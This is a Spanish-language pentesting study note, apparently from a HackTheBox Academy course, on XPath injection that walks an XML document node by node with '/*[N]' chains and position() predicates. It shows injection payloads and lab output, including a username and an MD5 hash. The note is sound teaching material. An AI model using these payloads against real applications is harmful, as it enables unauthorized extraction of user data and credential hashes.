---
tags:
  - Web/Red-Team
  - XPath
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[03 - Exfiltración de datos con XPath]]"
Nota siguiente: "[[05 - XPath ciega y basada en tiempo]]"
Area: "[[XPath Injection.base|XPath Injection]]"
---
---

El volcado directo con `| //text()` falla cuando la aplicación **limita la salida** (devuelve solo N resultados, o filtra qué campos muestra). Entonces hay que reconstruir el documento **nodo a nodo**, recorriendo el árbol XML por índices. Dos vías: manipular la selección de nodos (`/*[N]`) o el predicado (`position()`).

# Descubrir la profundidad del esquema

En caja negra no sabemos la profundidad del árbol. La averiguamos encadenando `/*[1]` (primer hijo, un nivel más abajo cada vez) hasta que aparezca un valor:

```text
f = fullstreetname | /*[1]                 → nada
f = fullstreetname | /*[1]/*[1]            → nada
f = fullstreetname | /*[1]/*[1]/*[1]       → nada
f = fullstreetname | /*[1]/*[1]/*[1]/*[1]  → 01ST ST   ← profundidad 4
```

<mark style="background: #ADCCFFA6;">`/*[1]` selecciona el primer nodo elemento hijo; cada `/*[1]` adicional baja un nivel</mark>. Cuando la respuesta deja de estar vacía, esa es la profundidad de esa rama.

# Recorrer los nodos (walking)

Fijada la profundidad, se itera el **último** índice para leer los hermanos, y el **penúltimo** para saltar al siguiente registro:

```text
.../*[1]/*[1]/*[1]/*[1]  → 01ST ST     (nombre largo)
.../*[1]/*[1]/*[1]/*[2]  → 01ST        (nombre corto)
.../*[1]/*[1]/*[1]/*[3]  → street_type
.../*[1]/*[1]/*[1]/*[4]  → No Results  ← fin de este registro
.../*[1]/*[1]/*[2]/*[1]  → 02ND AVE    ← siguiente registro
```

> [!warning]+ El árbol no tiene profundidad uniforme
> Las ramas cuelgan a distinta profundidad. En el ejemplo, `street` está en `/dataset/streets/street` pero `user` está más abajo, en `/dataset/users/group/user`. <mark style="background: #FFB86CA6;">Los datos jugosos (usuarios, hashes) suelen estar en la rama que el volcado directo no alcanza</mark>. Cambiando a la segunda rama (`/*[1]/*[2]/...`) y bajando llegamos a ellos:

```text
.../*[1]/*[2]/*[1]/*[1]/*[1]  → htb-stdnt                          (username)
.../*[1]/*[2]/*[1]/*[1]/*[2]  → 295362c2618a05ba3899904a6a3f5bc0   (hash MD5)
.../*[1]/*[2]/*[1]/*[1]/*[3]  → HackTheBox Academy Student Account (descripción)
```

<mark style="background: #8000E1A6;">Mapeando índices reconstruyes el documento entero</mark>, incluidos los nodos que el `//text()` no revelaba por estar en ramas profundas.

# Vía predicado: `position()`

Si la aplicación **no** permite tocar la parte de selección de nodos (solo el predicado), se pagina con `position()`:

```xpath
/a/b/c[contains(d/text(), '') and (position()>0) and ('1'='1')]/fullstreetname
```

Devuelve los primeros cinco resultados. Subiendo el umbral de cinco en cinco (`position()>5`, `position()>10`…) se recorre todo el conjunto.

> [!important]+
> El walking a mano es tedioso y propenso a errores: <mark style="background: #FF5582A6;">en un caso real, script obligatorio</mark> (un bucle que incrementa índices y parsea la respuesta). Es exactamente lo que automatiza [`XCat`](https://github.com/orf/xcat) → ver [[07 - Arsenal de herramientas XPath]]. Y cuando la respuesta **no** refleja el dato extraído —solo cambia entre "hay resultado / no hay"— pasamos a la [[05 - XPath ciega y basada en tiempo|explotación ciega]].
